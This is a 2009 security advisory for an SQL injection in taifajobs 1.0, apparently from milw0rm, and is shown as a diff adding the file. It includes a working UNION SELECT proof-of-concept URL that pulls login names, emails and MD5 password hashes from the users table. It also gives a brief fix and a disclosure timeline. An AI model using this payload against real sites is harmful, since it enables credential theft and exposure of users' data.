@@ -1,0 +1,93 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_103$2009
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_103$2009] taifajobs <= 1.0 (jobid) Remote SQL Injection Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author       : K-159
+Date         : February, 23 th 2009
+Location     : Jakarta, Indonesia
+Web          : http://e-rdc.org/v1/news.php?readmore=126
+Critical Lvl : Medium
+Impact       : Manipulation of data / Exposure of sensitive information
+Where        : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application : taifajobs
+version     : <= 1.0
+Vendor      : http://sourceforge.net/projects/taifajobs
+Description :
+
+In job recruitment system job seekers and recruiters post their details.
+The job seekers create an online resume on their profiles 
+and recruiters can add the organization's information, post & manage job advertisements & applications.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~
+
+Input passed to the "jobid" parameter in jobdetails.php page is not properly verified before being used 
+in sql queries.This vulnerability can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+
+Successful exploitation allows attacker retrieving users email,loginname and md5 hash password.
+
+
+Poc/Exploit:
+~~~~~~~~
+
+http://www.example.com/[path]/jobdetails.php?jobid=-5 union select 1,2,3,4,5,6,concat(admin,0x3a,email,0x3a,loginname,0x3a,pass),8,9,0,1,2,3,4,5,6,7,8,9,0 from users--
+
+Dork:
+~~~
+Google : N/A
+
+
+Solution:
+~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+
+Timeline:
+~~~~~~~
+
+- 12 - 02 - 2009 bug found
+- 13 - 02 - 2009 vendor contacted but no response
+- 23 - 02 - 2009 advisory released
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~
+~ ping - my dearest wife, zautha - my beloved son, and my next beloved daughter "welcome to the world".
+~ y3dips,the_day (congratz for the baby),Negatif,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v,az001,
+the_hydra,neng chika, str0ke
+~ scanners [at] SCAN-NUSANTARA and SCAN-ASSOCIATES
+~ SK,Abond,pokley,cybertank, super_temon,whatsoever,b120t0,inggar,fachri,adi,rahmat,indra
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,cyb3rh3b,cR4SH3R,ogeb,bagan,devsheed
+~ dr188le,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,ghostblup,shamus,
+kuntua, stev_manado,nofry,k1tk4t,0pt1c,k1ngk0ng
+~ newbie_hacker@yahoogroups.com
+~ milw0rm.com, macaholic.info, unitiga.com, mac.web.id, indowebster.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~
+
+K-159 || echo|staff || adv[at]e-rdc[dot]org
+Homepage: http://www.e-rdc.org/
+
+-------------------------------- [ EOF ] ---------------------------------- 
+
+# milw0rm.com [2009-02-23]
